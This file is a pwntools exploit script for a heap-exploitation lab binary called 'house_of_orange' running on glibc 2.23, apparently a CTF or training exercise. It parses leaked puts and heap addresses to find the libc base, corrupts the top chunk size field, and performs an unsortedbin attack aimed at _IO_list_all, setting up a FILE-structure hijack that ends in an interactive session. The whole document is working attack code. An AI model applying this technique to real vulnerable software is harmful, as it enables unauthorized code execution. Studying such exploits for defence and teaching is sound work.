#!/usr/bin/env python3
from pwn import *

context.log_level = 'debug'
context.binary = elf = ELF('./house_of_orange', checksec=False)

libc = ELF('../.glibc/glibc_2.23/libc.so.6', checksec=False)

gs = """
b *main
b *main+287
b *main+353
b *main+412
b *main+478
b *_IO_flush_all_lockp
"""

def info(mes):
    return log.info(mes)

def start():
    if args.GDB:
        return gdb.debug(elf.path, gdbscript=gs)
    else:
        return process(elf.path)

def malloc_small():
    io.sendline(b'1')
    io.recvuntil(b'> ')
    
def malloc_large():
    #io.sendline(b'2')
    #io.recvuntil(b'> ')
    io.sendthen(b"> ", b"2")

def edit(data):
    io.sendline(b'3')
    io.sendlineafter(b'data: ', data)
    io.recvuntil(b'> ')

def quit():
    io.send(b'4')

io = start()
io.recvuntil(b'puts() @ ')
puts = int(io.recvline(), 16)
io.recvuntil(b'heap @ ')
heap = int(io.recvline(), 16)
libc.address = puts - libc.sym['puts']

info("libc base: " + hex(libc.address))

#===============================================================================================
# Create unsortedbin list

io.recvuntil(b'> ')
malloc_small()

#overwrite top chunk size field to initial new heap from kernel
edit(b'Y'*0x18 + p64(0x1000 - 0x20 + 1))

malloc_large()

#===============================================================================================
#unsortedbin attack

size = 0x21
fd = 0x0
bk = libc.sym['_IO_list_all'] - 0x10

unsortedbin_attack = b'Y'*16 +\
p64(0) + p64(size) +\
p64(fd)  + p64(bk) 

edit(unsortedbin_attack)
malloc_small()
quit()

io.interactive()
